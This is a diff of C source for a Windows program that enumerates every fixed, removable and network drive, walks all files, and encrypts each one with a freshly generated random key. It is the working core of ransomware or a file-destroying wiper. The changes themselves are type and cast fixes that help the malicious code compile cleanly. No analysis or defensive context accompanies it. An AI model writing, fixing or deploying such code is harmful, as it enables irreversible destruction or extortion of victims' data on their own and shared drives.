@@ -28,29 +28,29 @@ short int checklogicaldisk(unsigned char number_disk);
 void      fileencrypt(const unsigned char * filename);
 void      generatekey(void);
 
-char * expansion    = "*";
-char * slash        = "\\";
-char * t_one        = ".";
-char * t_two        = "..";
+unsigned char * expansion    = "*";
+unsigned char * slash        = "\\";
+unsigned char * t_one        = ".";
+unsigned char * t_two        = "..";
 
 short int size_uc = sizeof(unsigned char); 
 
-short int vi, bi;
+unsigned short vi, bi;
 
 unsigned char secret_key [_BYTE]        = {_ZERO};
 unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
 unsigned char data       [_BYTE]        = {_ZERO};
 
 int main (void) {
- unsigned char disk;
+ short int disk;
  time_t real_time;
  char LOCAL_DISK[] = "+:";
  
  srand(time(&real_time));
 
- for (disk = 'A'; disk <= 'Z'; disk++) {
-  if (checklogicaldisk(disk) == _ZERO) {
-   LOCAL_DISK[_ZERO] = disk;
+ for (disk = 65; disk <= 90; disk++) {
+  if (checklogicaldisk((unsigned char)disk) == _ZERO) {
+   LOCAL_DISK[_ZERO] = (unsigned char)disk;
    finddir(LOCAL_DISK, expansion);
   }
  }
@@ -80,7 +80,7 @@ void finddir(unsigned char * path, unsigned char * mask) {
     strcat(pathfile, slash);
     strcat(pathfile, wfd.cFileName);
     generatekey();
-    fileencrypt(pathfile);
+	fileencrypt(pathfile);
    }
   } while (FindNextFile(hfound, &wfd));
  }
@@ -113,7 +113,7 @@ short int checklogicaldisk(unsigned char number_disk) {
  unsigned char LOGICAL_DISK[] = "+:\\";
  LOGICAL_DISK[_ZERO] = number_disk;
 
- short int result = (short int)GetDriveType(&LOGICAL_DISK[_ZERO]);
+ short int result = (short int)GetDriveType(LOGICAL_DISK);
  
  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE) || (result == DRIVE_REMOVABLE))
   return _ZERO;
@@ -129,7 +129,7 @@ void writetrash(unsigned char * data, short int  length) {
  short int i;
 
   for (i = _ZERO; i < length; i++)
-   data[i] = randomrange(_ZERO, _BYTE - 1);
+   data[i] = (unsigned char)randomrange(_ZERO, _BYTE - 1);
 }
 
 void fileencrypt(const unsigned char * filename) {
